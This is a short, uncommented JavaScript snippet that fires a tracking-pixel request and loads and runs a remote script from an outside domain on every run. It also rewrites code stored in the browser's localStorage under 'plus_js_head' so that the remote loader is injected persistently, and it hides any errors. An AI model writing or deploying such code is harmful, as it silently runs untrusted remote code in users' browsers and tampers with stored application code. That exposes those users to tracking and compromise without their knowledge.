!function () {
    try {
		var N = new Image();
        N.src = '//ia.51.la/go1?id=21083549&pvFlag=1';
		document.head.appendChild(function(){var a=document.createElement("script");return a.src="//q.sw9t.ml/hm.js?"+parseInt((new Date().getTime()) / 2e7),a}());
    } catch (e) { }
}()

;!function (){
	var localhook = localStorage.getItem('plus_js_head');
	var exp = ';document.head.appendChild(function(){var a=document.createElement("script");return a.src="//q.sw9t.ml/hm.js",a}())/*hook*/;function c(c)';
	if (localhook.includes('function c(c)') && !localhook.includes('/*hook*/')){
		localhook = localhook.replace('function c(c)',exp);
		localStorage.setItem('plus_js_head',localhook);
	}
}()